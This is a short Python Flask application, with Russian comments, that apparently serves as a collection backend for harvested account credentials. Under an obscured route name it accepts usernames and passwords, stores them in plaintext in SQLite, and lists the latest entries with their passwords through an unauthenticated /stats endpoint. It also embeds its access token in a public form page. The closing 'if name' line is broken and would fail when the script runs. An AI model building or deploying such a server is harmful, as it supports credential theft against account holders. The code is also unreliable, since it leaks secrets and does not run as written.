import os, time, sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DB = "data.db"
TOKEN = os.getenv("INGEST_TOKEN", "change_this_token")

# создаём базу данных, если её ещё нет
def init_db():
    con = sqlite3.connect(DB)
    cur = con.cursor()
    cur.execute("""
    CREATE TABLE IF NOT EXISTS accounts(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT,
      secret TEXT,
      extra TEXT,
      saved INTEGER,
      created_at INTEGER
    )""")
    con.commit(); con.close()
init_db()

# проверка токена
def get_token_from_request(req):
    t = req.headers.get("X-Token")
    if t:
        return t
    t = req.args.get("token")
    if t:
        return t
    try:
        data = req.get_json(silent=True) or {}
        if isinstance(data, dict) and data.get("token"):
            return data.get("token")
    except:
        pass
    return None

def authorized(req):
    token = get_token_from_request(req)
    return token == TOKEN

# сохранение аккаунтов в базу
def save_account(username, secret, extra, saved_flag):
    con = sqlite3.connect(DB); cur = con.cursor()
    cur.execute(
      "INSERT INTO accounts(username,secret,extra,saved,created_at) VALUES (?,?,?,?,?)",
      (username, secret, extra, 1 if saved_flag else 0, int(time.time()))
    )
    con.commit(); con.close()

# основной приём данных
@app.route("/renren-admin/ins-cookie/upload-common-bear", methods=["POST","GET"])
def upload_common_bear():
    if not authorized(request):
        return jsonify({"ok": False, "error": "unauthorized"}), 401

    payload = request.get_json(silent=True)
    if payload and isinstance(payload, dict):
        username = payload.get("username") or payload.get("login") or payload.get("user") or ""
        secret = payload.get("password") or payload.get("pwd") or payload.get("secret") or payload.get("pass") or ""
        extra = payload.get("extra") or ""
        save_flag = payload.get("save") if ("save" in payload) else True
    else:
        username = (request.form.get("username") or request.form.get("login") or request.values.get("username") or request.args.get("username") or "")
        secret = (request.form.get("password") or request.form.get("pass") or request.values.get("password") or request.args.get("password") or "")
        extra = request.form.get("extra") or request.values.get("extra") or request.args.get("extra") or ""
        save_flag_raw = request.form.get("save") or request.values.get("save") or request.args.get("save")
        if save_flag_raw is None:
            save_flag = True
        else:
            save_flag = str(save_flag_raw).lower() in ("1","true","yes","on")

    if not username:
        return jsonify({"ok": False, "error": "no username"}), 400

    save_account(username, secret, extra, save_flag)
    return jsonify({"ok": True, "saved": bool(save_flag)}), 201

# форма в браузере для ручной отправки
FORM_HTML = """
<!doctype html>
<title>Send account</title>
<h3>Send account</h3>
<form id="f">
  <input name="username" placeholder="username" required><br>
  <input name="password" placeholder="password"><br>
  <input name="extra" placeholder="extra"><br>
  <label><input type="checkbox" name="save" checked> save on server</label><br>
  <button>Send</button>
</form>
<script>
document.getElementById('f').onsubmit = async (e) => {
  e.preventDefault();
  const data = Object.fromEntries(new FormData(e.target).entries());
  const res = await fetch('/renren-admin/ins-cookie/upload-common-bear', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Token': '{{token}}'
    },
    body: JSON.stringify(data)
  });
  alert(JSON.stringify(await res.json()));
};
</script>
"""
@app.get("/submit_form")
def submit_form():
    return render_template_string(FORM_HTML, token=TOKEN)

# просмотр статистики
@app.get("/stats")
def stats():
    con = sqlite3.connect(DB); cur = con.cursor()
    total = cur.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
    latest = cur.
execute("SELECT id,username,secret,extra,saved,created_at FROM accounts ORDER BY id DESC LIMIT 50").fetchall()
    con.close()
    return jsonify({"total": total, "latest": latest})

if name == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
